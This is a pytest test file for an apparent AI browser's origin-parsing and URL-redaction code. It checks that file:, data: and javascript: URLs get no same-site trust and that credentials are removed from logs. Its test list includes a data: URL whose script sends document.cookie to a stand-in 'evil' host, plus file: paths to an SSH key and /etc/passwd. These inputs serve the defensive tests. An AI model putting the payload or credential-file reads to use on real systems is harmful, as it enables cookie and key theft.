"""Origins are the permission layer's key, so the parsing has to be exact.

The regression this file exists for: the old gate compared bare hostnames, and
every URL without one (file:, data:, javascript:, about:) produced an empty
string that made the "is this a different site?" check falsy — so no gate ran.
The less ordinary the scheme, the more freedom it got.
"""

from __future__ import annotations

import pytest

from lyra_browser.origin import Origin, loggable_url, parse_origin

# URLs with no authority. Each one used to sail past the navigate gate.
OPAQUE_URLS = [
    "file:///Users/unohee/.ssh/id_rsa",
    "data:text/html,<script>fetch('//evil/'+document.cookie)</script>",
    "javascript:alert(1)",
    "about:blank",
    "blob:https://example.com/uuid",
    "view-source:https://example.com/",
    "chrome://settings",
]


@pytest.mark.parametrize("url", OPAQUE_URLS)
def test_authority_less_urls_are_opaque(url):
    assert parse_origin(url).is_opaque


@pytest.mark.parametrize("url", OPAQUE_URLS)
def test_opaque_origins_are_never_same_site(url):
    """Not even with a normal site, and not with each other."""
    opaque = parse_origin(url)
    assert not opaque.same_site_as(parse_origin("https://example.com/"))
    assert not parse_origin("https://example.com/").same_site_as(opaque)
    # Two file:// URLs are not a shared trust domain.
    assert not opaque.same_site_as(parse_origin(url))


def test_opaque_origin_keeps_its_scheme_for_the_audit_trail():
    assert parse_origin("file:///etc/passwd").scheme == "file"
    assert "file" in parse_origin("file:///etc/passwd").describe()


# --------------------------------------------------------------------------
# Ordinary origins
# --------------------------------------------------------------------------


def test_same_origin_is_same_site():
    a = parse_origin("https://example.com/one")
    b = parse_origin("https://example.com/two?q=1#frag")
    assert a.same_site_as(b)


def test_scheme_is_part_of_identity():
    """An https -> http downgrade is leaving the site, not staying on it."""
    assert not parse_origin("http://example.com/").same_site_as(
        parse_origin("https://example.com/")
    )


def test_default_port_is_normalised():
    assert parse_origin("https://example.com:443/") == parse_origin("https://example.com/")
    assert parse_origin("http://example.com:80/") == parse_origin("http://example.com/")


def test_non_default_port_is_part_of_identity():
    assert not parse_origin("https://example.com:8443/").same_site_as(
        parse_origin("https://example.com/")
    )


def test_host_is_case_folded():
    assert parse_origin("https://EXAMPLE.com/").same_site_as(parse_origin("https://example.com/"))


def test_subdomain_is_a_different_origin():
    assert not parse_origin("https://api.example.com/").same_site_as(
        parse_origin("https://example.com/")
    )


# --------------------------------------------------------------------------
# Degenerate input must not raise — the gate calls this on whatever it is given
# --------------------------------------------------------------------------


@pytest.mark.parametrize("url", ["", "   ", "not a url", "https://", "://x", "https://[bad"])
def test_degenerate_input_is_opaque_not_an_exception(url):
    assert parse_origin(url).is_opaque


def test_unparseable_port_is_opaque():
    # urlparse defers the ValueError to .port, so this must be caught.
    assert parse_origin("https://example.com:notaport/").is_opaque


def test_describe_is_readable():
    assert parse_origin("https://example.com/").describe() == "https://example.com"
    assert parse_origin("https://example.com:8443/").describe() == "https://example.com:8443"
    assert str(Origin("https", "example.com", None)) == "https://example.com"


def test_loggable_url_strips_credentials_from_the_authority():
    """The query is not the only place a password rides in a URL.

    This stripped ``?password=`` while leaving ``user:password@`` untouched two
    fields to its left — writing the credential into the trail whose purpose is
    keeping credentials out of it. The host stays: what was reached is the point.
    """
    got = loggable_url("https://svc:Tr0ub4dor@intranet.corp:8443/api/keys?token=abc")

    assert "Tr0ub4dor" not in got
    assert "svc" not in got
    assert "intranet.corp:8443" in got
    assert "<redacted: token>" in got


def test_loggable_url_keeps_a_plain_authority_intact():
    assert loggable_url("https://example.com:8443/a/b") == "https://example.com:8443/a/b"
